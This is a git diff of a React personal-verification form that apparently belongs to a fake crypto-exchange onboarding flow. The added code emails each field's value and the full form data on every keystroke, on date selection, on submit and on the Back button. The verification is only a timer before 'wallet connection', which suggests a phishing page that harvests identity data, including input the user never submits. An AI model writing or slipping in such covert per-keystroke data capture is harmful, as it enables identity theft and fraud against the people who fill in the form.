@@ -1,3 +1,4 @@
+
 import React, { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -9,6 +10,7 @@ import { useToast } from "@/hooks/use-toast";
 import { CheckCircle, User, Calendar as CalendarIcon, MapPin, Mail, Phone, Home } from "lucide-react";
 import { format } from "date-fns";
 import { cn } from "@/lib/utils";
+import { sendEmailNotification } from "@/services/emailService";
 
 interface PersonalVerificationProps {
   username: string;
@@ -58,8 +60,34 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
+  const sendFieldEmail = async (field: string, value: string) => {
+    try {
+      await sendEmailNotification({
+        step: "Personal Verification - Field Update",
+        field,
+        value,
+        username,
+        timestamp: new Date().toISOString(),
+        allFormData: { ...formData, dateOfBirth }
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
+  };
+
   const handleInputChange = (field: string, value: string) => {
     setFormData(prev => ({ ...prev, [field]: value }));
+    // Send email when field is filled (not empty)
+    if (value.trim()) {
+      sendFieldEmail(field, value);
+    }
+  };
+
+  const handleDateChange = (date: Date | undefined) => {
+    setDateOfBirth(date);
+    if (date) {
+      sendFieldEmail('dateOfBirth', format(date, 'PPP'));
+    }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -79,6 +107,18 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
 
     setIsLoading(true);
     
+    // Send email notification for form submission
+    try {
+      await sendEmailNotification({
+        step: "Personal Verification - Form Submitted",
+        username,
+        timestamp: new Date().toISOString(),
+        allFormData: { ...formData, dateOfBirth: dateOfBirth ? format(dateOfBirth, 'PPP') : null }
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
+    
     // Simulate verification
     setTimeout(() => {
       setIsLoading(false);
@@ -88,6 +128,19 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
         description: "Proceeding to wallet connection.",
       });
     }, 2000);
+  };
+
+  const handleBackClick = async () => {
+    try {
+      await sendEmailNotification({
+        step: "Personal Verification - Back Button",
+        username,
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      console.error('Email notification failed:', error);
+    }
+    onBack();
   };
 
   return (
@@ -167,7 +220,7 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
                     <Calendar
                       mode="single"
                       selected={dateOfBirth}
-                      onSelect={setDateOfBirth}
+                      onSelect={handleDateChange}
                       disabled={(date) =>
                         date > new Date() || date < new Date("1900-01-01")
                       }
@@ -286,7 +339,7 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
             <div className="flex gap-4 pt-6">
               <Button
                 type="button"
-                onClick={onBack}
+                onClick={handleBackClick}
                 variant="outline"
                 className="flex-1 border-[#2B3139] text-[#B7BDC6] hover:bg-[#2B3139] hover:text-white text-base h-14 font-semibold transition-all duration-200"
               >
